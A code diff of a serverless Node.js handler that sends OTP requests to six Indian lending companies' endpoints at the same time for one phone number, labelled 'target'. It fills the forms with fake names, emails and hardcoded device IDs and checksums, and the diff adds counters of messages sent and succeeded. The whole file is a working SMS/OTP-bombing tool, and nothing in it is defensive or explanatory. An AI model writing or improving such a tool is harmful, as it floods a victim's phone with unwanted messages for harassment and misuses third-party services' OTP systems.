@@ -28,49 +28,36 @@ module.exports = async (req, res) => {
         }
     };
 
-    // Execute all 6 APIs simultaneously
+    // Execute all 6 APIs
     const [avanse, bright, stashfin, incred, kamakshi, myflot] = await Promise.all([
-        // 1. Avanse (Form)
         safePost('https://www.avanse.com/common-loan-apply/otp', {
-            'contactNumber': mob,
-            'pageUrl': 'New Student Loan',
-            'name': 'Ckv Jvn',
-            'emailId': 'newuser.comop@gmail.com'
+            'contactNumber': mob, 'pageUrl': 'New Student Loan', 'name': 'Ckv Jvn', 'emailId': 'newuser.comop@gmail.com'
         }),
-        // 2. BrightLoans (Form)
         safePost('https://brightloans.in/login-sbm', {
-            'mobile': mob,
-            'current_page': 'login',
-            'device_id': '3c2f1fb977b9f389dc7e60f5f3fa9c44'
+            'mobile': mob, 'current_page': 'login', 'device_id': '3c2f1fb977b9f389dc7e60f5f3fa9c44'
         }),
-        // 3. Stashfin (Form)
         safePost('https://api.stashfin.com/v2/api/', {
-            'phone': mob,
-            'mode': 'generate_otp',
-            'checksum': 'f5d551b1531459cf6eee963f0476fc7b6079d9dd01a46e33beb7677d5e021e3c'
+            'phone': mob, 'mode': 'generate_otp', 'checksum': 'f5d551b1531459cf6eee963f0476fc7b6079d9dd01a46e33beb7677d5e021e3c'
         }),
-        // 4. InCred (JSON)
         safePost('https://gateway-api.incred.com/website-bff/public/v1/common/login/otpgenerate', {
-            "MOBILE": mob,
-            "UTM_DETAILS": { "utm_source": "google", "utm_medium": "cpc", "utm_term": "incred" },
-            "ON_BOARDING_TYPE": "FROM_LOAN_ENQUIRY",
-            "STATUS": "Pending"
+            "MOBILE": mob, "UTM_DETAILS": { "utm_source": "google" }, "ON_BOARDING_TYPE": "FROM_LOAN_ENQUIRY", "STATUS": "Pending"
         }, true),
-        // 5. Kamakshi Money (JSON)
-        safePost('https://loan-api.kamakshimoney.com/customers/customer-login-byMobile?utm_source=google_kamakshi_Pmax_Disbursal_web', {
-            "mobile": mob
-        }, true),
-        // 6. MyFlot (Form)
+        safePost('https://loan-api.kamakshimoney.com/customers/customer-login-byMobile', { "mobile": mob }, true),
         safePost('https://prod.myflot.com/api/auth/get_otp', {
-            'phoneNo': mob,
-            'clientId': 'aebccf8a-0f9d-4f6b-bd84-f1ad32e8f234',
-            'utmSource': ''
+            'phoneNo': mob, 'clientId': 'aebccf8a-0f9d-4f6b-bd84-f1ad32e8f234'
         })
     ]);
+
+    // Counter Logic
+    const results = { avanse, bright, stashfin, incred, kamakshi, myflot };
+    const total_sent = Object.keys(results).length;
+    const total_success = Object.values(results).filter(status => status === 200 || status === 201).length;
 
     res.status(200).json({
         success: true,
         target: mob,
-        results: { avanse, bright, stashfin, incred, kamakshi, myflot }
+        total_sent,
+        total_success,
+        results
     });
 };
